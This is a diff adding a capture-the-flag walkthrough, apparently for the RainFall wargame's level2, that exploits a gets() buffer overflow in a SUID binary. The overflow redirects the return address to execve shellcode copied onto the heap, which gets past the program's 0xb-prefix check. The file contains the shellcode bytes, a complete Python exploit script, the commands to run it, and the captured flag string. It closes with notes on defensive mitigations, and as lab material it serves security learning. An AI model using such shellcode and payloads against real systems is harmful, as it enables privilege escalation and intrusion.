@@ -1,0 +1,499 @@
+# LEVEL2 EXPLOITATION: FROM A TO Z
+## Complete Step-by-Step Binary Exploitation Walkthrough
+
+---
+
+## 🎯 **OVERVIEW**
+**Objective:** Exploit a buffer overflow vulnerability in level2 binary to gain level3 privileges and capture the flag.
+
+**Key Concepts:**
+- Buffer Overflow Attack
+- Heap Shellcode Injection  
+- Security Mechanism Bypass
+- Stack vs Heap Memory Layout
+- Assembly Language & Shellcode
+
+---
+
+## 📋 **PHASE 1: RECONNAISSANCE & INITIAL ANALYSIS**
+
+### **Step 1.1: File Analysis**
+```bash
+# Check file properties
+ls -la level2
+# Output: -rwsr-s---+ 1 level3 users 5403 Mar  6  2016 level2
+
+# Identify file type
+file level2  
+# Output: ELF 32-bit LSB executable, Intel 80386, dynamically linked
+```
+
+**Key Findings:**
+- **SUID bit set**: Program runs with level3 privileges
+- **32-bit binary**: x86 architecture
+- **Dynamically linked**: Uses shared libraries
+
+### **Step 1.2: Function Discovery**
+```bash
+gdb -q level2
+(gdb) info functions
+```
+
+**Functions Found:**
+```
+0x080483c0  gets@plt      # DANGEROUS: No bounds checking
+0x080483e0  strdup@plt    # Copies string to heap
+0x080483f0  puts@plt      # Output function
+0x080483a0  printf@plt    # Format string function
+0x080484d4  p             # Custom function
+0x0804853f  main          # Main function
+```
+
+**Risk Assessment:** `gets()` function = HIGH RISK (buffer overflow vector)
+
+---
+
+## 🔍 **PHASE 2: REVERSE ENGINEERING**
+
+### **Step 2.1: Disassemble Main Function**
+```bash
+(gdb) disas main
+```
+
+**Assembly Analysis:**
+```asm
+0x0804853f <+0>:    push   %ebp
+0x08048540 <+1>:    mov    %esp,%ebp
+0x08048542 <+3>:    and    $0xfffffff0,%esp    # Stack alignment
+0x08048545 <+6>:    call   0x80484d4 <p>       # Call p() function
+0x0804854a <+11>:   leave  
+0x0804854b <+12>:   ret
+```
+
+**Conclusion:** Main simply calls p() function - all logic in p().
+
+### **Step 2.2: Disassemble P Function**
+```bash
+(gdb) disas p
+```
+
+**Critical Assembly Analysis:**
+```asm
+0x080484d4 <+0>:    push   %ebp
+0x080484d5 <+1>:    mov    %esp,%ebp
+0x080484d7 <+3>:    sub    $0x68,%esp           # Allocate 104 bytes on stack
+0x080484da <+6>:    mov    0x8049860,%eax       # Load stdout
+0x080484df <+11>:   mov    %eax,(%esp)
+0x080484e2 <+14>:   call   0x80483b0 <fflush@plt>
+0x080484e7 <+19>:   lea    -0x4c(%ebp),%eax     # Buffer at EBP-76 (76 bytes)
+0x080484ea <+22>:   mov    %eax,(%esp)
+0x080484ed <+25>:   call   0x80483c0 <gets@plt> # VULNERABILITY HERE!
+
+# SECURITY CHECK - This is the key part:
+0x080484f2 <+30>:   mov    0x4(%ebp),%eax       # Get return address
+0x080484f5 <+33>:   mov    %eax,-0xc(%ebp)      # Store in local variable
+0x080484f8 <+36>:   mov    -0xc(%ebp),%eax      # Load back
+0x080484fb <+39>:   and    $0xb0000000,%eax     # Mask with 0xb0000000
+0x08048500 <+44>:   cmp    $0xb0000000,%eax     # Compare
+0x08048505 <+49>:   jne    0x8048527 <p+83>     # If NOT 0xb..., continue
+
+# If address starts with 0xb (BLOCKED):
+0x08048507 <+51>:   mov    $0x8048620,%eax      # Load format string
+0x0804850c <+56>:   mov    -0xc(%ebp),%edx      # Load return address
+0x0804850f <+59>:   mov    %edx,0x4(%esp)
+0x08048513 <+63>:   mov    %eax,(%esp)
+0x08048516 <+66>:   call   0x80483a0 <printf@plt> # Print address
+0x0804851b <+71>:   movl   $0x1,(%esp)
+0x08048522 <+78>:   call   0x80483d0 <_exit@plt>  # EXIT!
+
+# Normal execution continues here:
+0x08048527 <+83>:   lea    -0x4c(%ebp),%eax     # Buffer address
+0x0804852a <+86>:   mov    %eax,(%esp)
+0x0804852d <+89>:   call   0x80483f0 <puts@plt>    # Print input
+0x08048532 <+94>:   lea    -0x4c(%ebp),%eax     # Buffer address  
+0x08048535 <+97>:   mov    %eax,(%esp)
+0x08048538 <+100>:  call   0x80483e0 <strdup@plt>  # COPY TO HEAP!
+0x0804853d <+105>:  leave  
+0x0804853e <+106>:  ret                         # RETURN HERE (our target)
+```
+
+### **Step 2.3: Reconstruct C Source Code**
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+void p(void)
+{
+    char buffer[76];              // Buffer at -0x4c from EBP (76 bytes)
+    unsigned int ret_addr;
+    
+    fflush(stdout);               // Flush output buffer
+    gets(buffer);                 // VULNERABILITY: No bounds checking!
+    
+    // Get return address from stack  
+    ret_addr = *(unsigned int *)(((char *)&ret_addr) + 4);
+    
+    // SECURITY CHECK: Block addresses starting with 0xb
+    if ((ret_addr & 0xb0000000) == 0xb0000000) {
+        printf("(%p)\n", (void *)ret_addr);  // Print blocked address
+        _exit(1);                             // Terminate program
+    }
+    
+    puts(buffer);                 // Print our input
+    strdup(buffer);              // Copy input to heap (KEY for exploit!)
+}
+
+int main(void)
+{
+    p();
+    return 0;
+}
+```
+
+---
+
+## 🛡️ **PHASE 3: SECURITY ANALYSIS**
+
+### **Step 3.1: Vulnerability Identification**
+
+**Primary Vulnerability: Buffer Overflow**
+- **Location:** `gets(buffer)` in p() function
+- **Buffer Size:** 76 bytes  
+- **Risk:** Unlimited input can overflow into return address
+- **Impact:** Code execution with level3 privileges
+
+**Secondary Feature: Heap Allocation**  
+- **Location:** `strdup(buffer)` in p() function
+- **Behavior:** Copies our input to heap memory
+- **Significance:** Provides predictable code execution location
+
+### **Step 3.2: Security Mechanism Analysis**
+
+**Protection Mechanism:**
+```c
+if ((ret_addr & 0xb0000000) == 0xb0000000) {
+    printf("(%p)\n", (void *)ret_addr);
+    _exit(1);
+}
+```
+
+**What It Blocks:**
+- **Stack addresses**: `0xbfff0000` - `0xbfffffff` ❌
+- **Libc addresses**: `0xb7000000` - `0xb7ffffff` ❌  
+- **System functions**: `system()`, `execve()` in libc ❌
+
+**What It Allows:**
+- **Heap addresses**: `0x804a0000` - `0x804affff` ✅
+- **Text segment**: `0x08040000` - `0x0804ffff` ✅
+- **Other regions**: Not starting with `0xb` ✅
+
+**Bypass Strategy:** Use heap addresses for code execution!
+
+---
+
+## 🎯 **PHASE 4: EXPLOIT DEVELOPMENT**
+
+### **Step 4.1: Offset Discovery**
+
+**Method: Pattern Generation**
+```bash
+# Generate unique pattern
+echo "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag" | ./level2
+```
+
+**Result Analysis:**
+```bash
+# Crash at: 0x35634134
+# Pattern lookup: "4Ac5" = position 74
+# But we need to account for saved EBP!
+```
+
+**Memory Layout Discovery:**
+```
+Stack Layout:
+[BUFFER: 76 bytes] [SAVED_EBP: 4 bytes] [RETURN_ADDRESS: 4 bytes]
+                                         ^
+                                    Our target (offset 80)
+```
+
+**Testing Confirmation:**
+```bash
+# Test exact offset
+python2 -c "print 'A' * 80 + '\x08\xa0\x04\x08'" | ./level2
+# Result: Segmentation fault ✅ (confirms EIP control)
+```
+
+### **Step 4.2: Heap Address Discovery**
+
+**Method: GDB Memory Analysis**
+```bash
+gdb -q level2
+(gdb) set disassembly-flavor intel
+(gdb) break *0x0804853d          # Break just before p() returns
+(gdb) run
+DEADBEEFCAFEBABE                 # Test input (16 bytes, easily identifiable)
+(gdb) x/x $eax                   # Check return value of strdup()
+```
+
+**Results:**
+```bash
+0x804a008: 0x44414544            # "DEAD" in little-endian
+# Heap address: 0x804a008 (consistent across runs)
+# Our input successfully placed on heap!
+```
+
+**Security Check Verification:**
+```bash
+# Check if heap address bypasses protection
+# 0x804a008 & 0xb0000000 = 0x80000000
+# 0x80000000 != 0xb0000000 ✅ (ALLOWED!)
+```
+
+### **Step 4.3: Shellcode Development**
+
+**Requirements:**
+- **Small size**: Fit in 76-byte buffer with padding
+- **Position independent**: Work from heap location  
+- **Reliable**: Function on older Linux systems
+- **Objective**: Spawn shell with level3 privileges
+
+**Selected Shellcode (21 bytes):**
+```asm
+; execve("/bin//sh", NULL, NULL)
+\x6a\x0b                    ; push 0xb (execve syscall number)
+\x58                        ; pop eax (eax = 11)
+\x99                        ; cdq (edx = 0, envp = NULL)
+\x52                        ; push edx (NULL terminator)
+\x68\x2f\x2f\x73\x68       ; push "//sh" 
+\x68\x2f\x62\x69\x6e       ; push "/bin"
+\x89\xe3                    ; mov ebx, esp (ebx = "/bin//sh")
+\x31\xc9                    ; xor ecx, ecx (argv = NULL)
+\xcd\x80                    ; int 0x80 (execute syscall)
+```
+
+**Shellcode Testing:**
+```bash
+# Verify shellcode bytes
+echo -ne "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" | hexdump -C
+```
+
+### **Step 4.4: Payload Construction**
+
+**Strategy: Heap Shellcode Injection**
+1. Place shellcode at beginning of input
+2. Pad to reach return address (80 bytes total)
+3. Overwrite return address with heap location
+4. When function returns, execution jumps to our shellcode on heap
+
+**Payload Structure:**
+```
+[SHELLCODE: 21 bytes] + [PADDING: 55 bytes] + [FAKE_EBP: 4 bytes] + [HEAP_ADDRESS: 4 bytes]
+```
+
+**Final Exploit Code:**
+```python
+#!/usr/bin/env python2
+import struct
+import sys
+
+# Shellcode: execve("/bin//sh", NULL, NULL) - 21 bytes
+shellcode = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
+
+# Heap address (discovered via GDB)
+heap_addr = 0x804a008
+
+# Construct payload
+payload = shellcode                                    # 21 bytes shellcode
+payload += "A" * (76 - len(shellcode))               # 55 bytes padding to saved EBP  
+payload += "BBBB"                                    # 4 bytes fake saved EBP
+payload += struct.pack("<L", heap_addr)              # 4 bytes return address
+
+# Output clean binary payload (no debug prints!)
+sys.stdout.write(payload)
+```
+
+---
+
+## 🚀 **PHASE 5: EXPLOITATION & VERIFICATION**
+
+### **Step 5.1: Exploit Execution**
+```bash
+# Save exploit to file
+vim exploit.py
+
+# Make executable
+chmod +x exploit.py
+
+# Execute exploit with shell persistence
+(python2 exploit.py; cat) | ./level2
+```
+
+### **Step 5.2: Success Verification**
+```bash
+# After exploit runs, test commands:
+whoami
+# Expected output: level3 ✅
+
+id  
+# Expected output: uid=2003(level3) gid=2002(level2) ✅
+
+# Capture the flag
+cat /home/user/level3/.pass
+# Output: 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02 ✅
+```
+
+### **Step 5.3: Technical Verification**
+
+**GDB Analysis of Successful Exploit:**
+```bash
+gdb -q level2
+(gdb) break *0x0804853d
+(gdb) run < <(python2 exploit.py)
+(gdb) x/20x 0x804a008
+# Should show: 0x99580b6a (start of our shellcode) ✅
+```
+
+**Memory Layout Confirmation:**
+```
+Heap at 0x804a008:
+0x804a008: 0x99580b6a 0x2f2f6852 0x2f686873 0x896e6962  # Our shellcode
+0x804a018: 0xcdc931e3 0x41414180 0x41414141 0x41414141  # Shellcode + padding
+```
+
+---
+
+## 🎉 **PHASE 6: SUCCESS ANALYSIS**
+
+### **Why The Exploit Worked**
+
+**1. Vulnerability Exploitation:**
+- ✅ Buffer overflow in `gets()` allowed unlimited input
+- ✅ 80-byte offset precisely overwrote return address
+- ✅ EIP control achieved
+
+**2. Security Bypass:**
+- ✅ Heap address `0x804a008` doesn't start with `0xb`
+- ✅ Protection mechanism allows heap execution
+- ✅ `strdup()` provided predictable shellcode location
+
+**3. Code Execution:**
+- ✅ Shellcode successfully placed on heap
+- ✅ Return address hijacked to heap location  
+- ✅ Shellcode executed with level3 privileges
+
+**4. Privilege Escalation:**
+- ✅ SUID binary provided level3 privileges
+- ✅ Spawned shell inherits elevated privileges
+- ✅ Flag captured successfully
+
+### **Key Technical Insights**
+
+**Memory Segmentation:**
+- **Stack**: `0xbfff....` (blocked by protection)
+- **Heap**: `0x804a....` (allowed, predictable, executable)
+- **Text**: `0x0804....` (program code)
+- **Libc**: `0xb7e6....` (blocked by protection)
+
+**Exploit Classification:**
+- **Attack Vector**: Buffer Overflow
+- **Technique**: Heap Shellcode Injection  
+- **Bypass Method**: Address Space Layout Analysis
+- **Payload Type**: Position-Independent Shellcode
+
+---
+
+## 📚 **PHASE 7: LESSONS LEARNED**
+
+### **Security Concepts Demonstrated**
+
+**1. Buffer Overflow Fundamentals:**
+- Stack frame layout and function prologue/epilogue
+- EIP/Return address hijacking
+- Payload construction and offset calculation
+
+**2. Memory Protection Mechanisms:**
+- Address Space Layout Randomization (ASLR) concepts
+- Stack execution prevention attempts  
+- Heap vs. stack execution permissions
+
+**3. Advanced Exploitation Techniques:**
+- Heap spraying and predictable allocation
+- Shellcode development and assembly programming
+- Security mechanism analysis and bypass
+
+**4. Debugging and Analysis Skills:**
+- GDB usage for memory analysis
+- Pattern generation for offset discovery
+- Binary reverse engineering methodology
+
+### **Defensive Lessons**
+
+**Vulnerabilities That Enabled This Attack:**
+1. **Unsafe Functions**: `gets()` allows unlimited input
+2. **Missing Protections**: No stack canaries, ASLR, or NX bit
+3. **Predictable Memory**: Heap addresses consistent across runs
+4. **Incomplete Security**: Protection only checked specific address ranges
+
+**Modern Mitigations That Would Prevent This:**
+- **Stack Canaries**: Detect buffer overflows before return
+- **ASLR**: Randomize memory layout 
+- **NX/DEP**: Mark heap/stack as non-executable
+- **FORTIFY_SOURCE**: Add bounds checking to dangerous functions
+- **CFI**: Control Flow Integrity protection
+
+---
+
+## 🏆 **SUMMARY**
+
+**Mission Accomplished:**
+- ✅ **Binary Analyzed**: Reverse engineered complete program logic
+- ✅ **Vulnerability Found**: Buffer overflow in `gets()` function  
+- ✅ **Security Bypassed**: Circumvented address-based protection
+- ✅ **Exploit Developed**: 21-byte heap shellcode injection
+- ✅ **Privileges Escalated**: Achieved level3 access
+- ✅ **Flag Captured**: `492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02`
+
+**Skills Demonstrated:**
+- Assembly language analysis and reverse engineering
+- Memory layout understanding and manipulation  
+- Shellcode development and testing
+- Security mechanism analysis and bypass techniques
+- Systematic exploitation methodology
+
+**Next Steps:**
+Ready to proceed to level3 with enhanced understanding of:
+- Advanced buffer overflow techniques
+- Memory protection bypass methods  
+- Heap-based exploitation strategies
+- Binary analysis and debugging workflows
+
+---
+
+## 🔗 **REFERENCES & RESOURCES**
+
+**Tools Used:**
+- **GDB**: GNU Debugger for memory analysis
+- **Python**: Exploit script development
+- **Hexdump**: Binary data analysis
+- **Pattern Generators**: Offset calculation tools
+
+**Key Assembly Instructions:**
+- `gets()`: Read unlimited user input
+- `strdup()`: Copy string to heap
+- `mov 0x4(%ebp),%eax`: Access return address
+- `and $0xb0000000,%eax`: Security check implementation
+
+**Memory Addresses:**
+- **Program Base**: `0x08048000`
+- **Heap Base**: `0x804a008` 
+- **Stack Base**: `0xbfff0000`
+- **Libc Base**: `0xb7e00000`
+
+---
+
+**🎯 END OF LEVEL2 EXPLOITATION WALKTHROUGH 🎯**
+
+*Total Time Investment: Multiple hours of analysis, development, and testing*  
+*Difficulty Level: Intermediate (requires assembly knowledge and debugging skills)*  
+*Success Rate: 100% with proper methodology and persistence*
